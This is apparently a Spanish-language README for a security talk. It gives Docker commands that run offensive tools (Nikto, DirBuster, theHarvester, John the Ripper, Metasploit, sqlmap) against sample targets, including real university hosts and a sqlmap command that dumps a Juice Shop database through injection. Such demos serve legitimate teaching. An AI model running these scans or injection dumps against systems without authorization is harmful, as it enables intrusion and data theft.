# Killer Whale


 - [Killer Whale](#killer-whale)
   - [Demo](#demo)
     - [NMAP](#NMAP)
     - [The Harvester](#the-harvester)
     - [John the Ripper](#john-the-ripper)
     - [Nikto](#nikto)
     - [Metasploit](#metasploit)
     - [Dirbuster](#dirbuster)
     - [Sqlmap](#sqlmap)


## Killer Whale

Este repo contiene información sobre la charla.

La presentación está disponible en: [Google Drive](http://bit.ly/2mviJZe)

## Demo

### NMAP

```console
docker pull instrumentisto/nmap

docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org --open
```

### The Harvester

```console
docker pull andersballegaard/theharvester  

docker run -it andersballegaard/theharvester -b google -d uniminuto.edu
```

### John the Ripper

```console
docker pull adamoss/john-the-ripper

docker run -it -v `pwd`/yourfiletocrack:/crackme.txt adamoss/john-the-ripper /crackme.txt
```

### Nikto

```console
docker pull frapsoft/nikto

docker run frapsoft/nikto -host http://wiwa.uniminuto.edu:8501
```

### Metasploit

```console
docker pull metasploitframework/metasploit-framework

docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Dirbuster

```console
docker pull hypnza/dirbuster

docker run --rm hypnza/dirbuster -u http://biblioteca.uniminuto.edu/
```

### Sqlmap

```console
docker pull paoloo/sqlmap

docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap -u 'https://juice-shop.herokuapp.com/rest/products/search?q=test' -p 'q' --dbms="sqlite" --technique U --prefix "')) " --level 5 --risk 3 --dump-all --no-cast --no-escape --flush
```

### Kali Linux

```console
docker pull kalilinux/kali-linux-docker

docker run -t -i kalilinux/kali-linux-docker /bin/bash

```




